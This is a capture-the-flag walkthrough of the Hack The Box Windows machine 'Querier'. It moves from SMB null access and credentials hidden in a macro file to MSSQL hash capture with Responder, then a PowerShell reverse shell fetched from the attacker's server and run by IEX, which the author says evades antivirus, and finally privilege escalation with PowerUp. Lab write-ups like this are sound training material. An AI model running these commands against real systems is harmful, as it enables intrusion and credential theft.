---
title: 'HTB - Querier'
author: paincakes
date: 2023-06-30 20:55:00 +0800
categories: [HTB, Medium]
tags: [windows, htb-walkthrough]
---


![Box-Info](https://paincakes.sirv.com/Images/HTB/Querier/Info.png)

# Summary
The machine **Querier** was a fun and medium level windows box, which involved macro file enumeration, mssql service exploitation, and some basic windows privilege escalation steps. We could access the SMB service with null authentication and download the macro files which contained credentials of a user which was used to connect with the mssql database. With help of mssql exploitation and Responder tool we could capture the NTLM hash of another privileged users by which we could spawn a reverse shell. After that using basic enumeration tools from Powerspolit we can escalate our privilege to Administrator user.


## NMAP Scanning

Let’s start with our Initial `nmap` scan,

![nmap](https://paincakes.sirv.com/Images/HTB/Querier/nmap.png)

The Nmap result shows gives some interesting Windows services and ports mainly focusing on,
- Port 135, 139, 445 running SMB service
- Port 1433 running MSSQL Service
- Port 5985, 47001 running HTTP service

*Note: The HTTP services are shown but not actually working*

## SMB Null Authentication

Seeing the SMB Service running I used crackmapexec command on smb services to check the domain names and see if we have access to the SMB service.

`crackmapexec smb <ip>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/domain.png)

Before doing any further enumeration do not forget to add the domain name and IP to the `/etc/hosts` file.
Now, we can use NULL authentication using smblient tool and access the shares from the smb service.

`smbclient -N -L ////<ip>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/smbclient%20null.png)

Clearly from the Names we can figure out that only **Reports** Share Folder is accessible, and others are default shares which we may not have access.
We can again access the share using smbclient and we can see a file **Currency Volume Report.xlsm** which we download it to our local machine using get.

`smbclient //<ip>/<share_name>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/file.png)

## Macro File Enumeration

Since the downloaded file had “m” after “xls” in its extension I guess it could be a macro file, and to confirm the doubt I opened it with Libre office which could not load the file and said it was a macro file. The macro file can be scanned and analyzed using [olevba](https://github.com/decalage2/oletools.git) tool which gave us the credentials for the database authentication.

`olevba <file_name>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/obleva.png)

## MSSQL Exploitation

After getting the credentials to connect to the database service we can login with impacket’s `mssqlclient.py` tool which can be used for executing commands remotely.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/mssql-svc.png)

The user “reporting” had very limited access and could not enumerate much useful information. After researching further on msssqlclient exploitation I found that using the `xp_dirtree` command we can get it to connect to the SMB service in our local machine where we can intercept it using `Responder` tool to capture the NTLM hash while it tried to connect to the SMB share.

`xp_dirtree “\\<ip>\<sharename>”`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/xp_dirtree.png)

### Using Responder To Get Hash

Before executing the command make sure that Responder in listening on the background.
`sudo responder -wd -v -I <interface>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/responder.png)

After executing the `xp_dirtree` command the Responder will Capture the NTLM hash of the **mssql-svc** user.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/hash.png)

Copy the hash in a file and try to crack it using `hashcat` tool.

### Cracking the hash

The hash captured by the responder can be cracked using `hashcat` or `john` password or any other password cracking tools, but in my case, I used `hashcat`.

`hashcat -m 5600 <file_containing_hash> <wordlist>`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/hashcat.png)

After some time, the hash is cracked and password for **mssql-svc** user is **corporate568**

![querier](https://paincakes.sirv.com/Images/HTB/Querier/hashcracked.png)

I tried logging in with smbclient using the credentials od “msssql-svc” user but still the shares were same with no further information. So again, I tried logging in with **mssqlclient.py** tool.

Using the impacket’s `mssqlclient.py` tool again and this time logging in with “mssql-svc” user who had more privileges than the “reporting” user. We can access the terminal from the `mssqlclient.py` using command.

```
enable_xp_cmdshell
xp_cmdshell <cmd>
```

For other commands execute `help` command.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/mssql-svc.png)

And we can see we our privilege of the current user using command,

`xp_cmdshell whomai /priv`

![querier](https://paincakes.sirv.com/Images/HTB/Querier/priv.png)

This terminal not so user friendly and commands are sometimes difficult to execute, let’s try spawning a reverse shell since now we have more privilege than **reporting** user.

### Getting Reverse Shell

For spawning a reverse shell, I used Nishang’s [PowershellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and renamed it to `rev.ps1` and hosted it using python http server. But before hosting the file in the http server, you should append the following line using echo.

`echo Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port> >> rev.ps1`

The remote machine will block the script if you try to execute it separately without appending it to the script. Appending that line to the script will execute it immediately after downloading it which will bypass the Antivirus software.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/invokecmd.png)
![querier](https://paincakes.sirv.com/Images/HTB/Querier/pythonserver.png)

After hosting the python http server open a netcat listener on another terminal, and now from `mssqlclient.py` we need to execute powershell command to download the file from our http server.

```
xp_cmdshell powershell IEX(New-Object New.WebClient).downloadstring(\”http://<ip>/<filename>\”)
```

After executing the xp_cmdshell command we will get the reverse shell on netcat listener which we had setup earlier and find the user flag on `C:\Users\mssql-svc\Desktop` Folder.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/userflag.png)

## Prvilege Escalation
Now we have a proper terminal, we can focus on privilege escalation. One of the best scripts to enumerate a Windows machine is [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) from Powerspolit. We can download it using `wget` in our machine and again host it using python http server.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/Powerup.png)

And again, before hosting the file over the http server we need to append the following line using echo.
`echo Invoke-AllChecks >> PowerUp.ps1`

Now on the reverse shell we can execute the `PowerUp.ps1` script and enumerate the windows machine with `Invoke -AllChecks` command which will give lots of useful information and vulnerabilities of the machine and reveals the credentials of **Administrator** User.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/admin%20creds.png)

Now after getting the credentials of **Administrator**, We can simply use impacket’s `psexec.py` to access the administrator privileged terminal of the remote machine.

The root flag will be found in `C:\Users\Administrator\Desktop\` Folder.

![querier](https://paincakes.sirv.com/Images/HTB/Querier/root%20flag.png)









